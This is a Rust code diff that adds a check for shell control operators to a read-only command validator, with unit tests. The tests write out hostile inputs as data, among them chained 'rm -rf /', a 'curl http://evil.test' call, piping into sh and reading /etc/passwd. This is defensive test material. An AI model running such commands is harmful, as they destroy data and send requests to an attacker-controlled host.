@@ -98,6 +98,10 @@ pub fn is_read_only_command(cmd: &str) -> bool {
 
     let cmd_lower = cmd.to_lowercase();
 
+    if contains_shell_control_operator(&cmd_lower) {
+        return false;
+    }
+
     // Check git subcommands first (they contain spaces)
     if read_only_git_subcommands
         .iter()
@@ -115,6 +119,42 @@ pub fn is_read_only_command(cmd: &str) -> bool {
     read_only_commands
         .iter()
         .any(|p| command_name == *p || first_word == *p)
+}
+
+fn contains_shell_control_operator(cmd: &str) -> bool {
+    let mut chars = cmd.chars().peekable();
+    let mut in_single_quote = false;
+    let mut in_double_quote = false;
+    let mut escaped = false;
+
+    while let Some(ch) = chars.next() {
+        if escaped {
+            escaped = false;
+            continue;
+        }
+
+        match ch {
+            '\\' if !in_single_quote => {
+                escaped = true;
+            }
+            '\'' if !in_double_quote => {
+                in_single_quote = !in_single_quote;
+            }
+            '"' if !in_single_quote => {
+                in_double_quote = !in_double_quote;
+            }
+            '`' if !in_single_quote => return true,
+            '$' if !in_single_quote && matches!(chars.peek(), Some('(')) => return true,
+            '\n' | '\r' if !in_single_quote && !in_double_quote => return true,
+            '>' | '<' | '|' | ';' if !in_single_quote && !in_double_quote => return true,
+            '&' if !in_single_quote && !in_double_quote => {
+                return true;
+            }
+            _ => {}
+        }
+    }
+
+    in_single_quote || in_double_quote
 }
 
 #[cfg(test)]
@@ -162,6 +202,25 @@ mod tests {
         assert!(!is_read_only_command("lsmod")); // Not "ls mod"
         assert!(!is_read_only_command("datestamp")); // Not "date stamp"
         assert!(!is_read_only_command("categorical-analysis")); // Not "cat"
+    }
+
+    #[test]
+    fn test_is_read_only_command_rejects_shell_control_operators() {
+        assert!(!is_read_only_command("echo hello > file.txt"));
+        assert!(!is_read_only_command("cat file.txt >> out.txt"));
+        assert!(!is_read_only_command("cat file.txt && rm -rf /"));
+        assert!(!is_read_only_command(
+            "cat file.txt || curl http://evil.test"
+        ));
+        assert!(!is_read_only_command("cat file.txt ; rm -rf /"));
+        assert!(!is_read_only_command("cat file.txt | sh"));
+        assert!(!is_read_only_command("cat < /etc/passwd"));
+        assert!(!is_read_only_command("echo $(whoami)"));
+        assert!(!is_read_only_command("echo `id`"));
+        assert!(!is_read_only_command("cat file.txt\nrm -rf /"));
+
+        assert!(is_read_only_command("echo 'hello > file.txt'"));
+        assert!(is_read_only_command("grep \"a|b\" file.txt"));
     }
 
     #[test]
